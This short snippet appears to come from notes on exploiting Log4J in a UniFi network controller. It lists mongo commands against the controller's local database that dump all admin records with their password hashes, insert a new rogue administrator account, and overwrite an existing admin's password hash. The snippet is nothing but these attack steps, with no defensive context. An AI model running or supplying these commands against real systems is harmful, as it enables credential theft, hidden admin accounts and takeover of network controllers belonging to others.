Below is example from Log4J unifi exploitation
```
# Dump user data
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

# Add new user
mongo --port 27117 ace --eval 'db.admin.insert({ "email" : "null@localhost.local", "last_site_name" : "default", "name" : "unifi-admin", "x_shadow" : "<PASSWORD-HASH>" })'

# Update user
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"<PASSWORD-HASH>"}})'
```
